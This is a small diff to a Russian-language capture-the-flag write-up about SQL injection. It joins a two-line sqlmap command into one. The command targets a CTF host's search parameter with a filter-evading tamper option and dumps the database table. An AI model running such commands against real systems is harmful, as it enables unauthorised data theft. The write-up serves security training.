@@ -117,8 +117,7 @@ Sqlmap подтвердил СУБД — SQLite, и определил пара�
 Дамп таблицы:
 
 ```bash
-sqlmap -u "http://polyctf.ru:5002/search?name=%D0%95%D0%B3%D0%BE%D1%80" \
-  --tamper=space2comment --level=5 --dump
+sqlmap -u "http://polyctf.ru:5002/search?name=%D0%95%D0%B3%D0%BE%D1%80" --tamper=space2comment --level=5 --dump
 ```
 
 ```
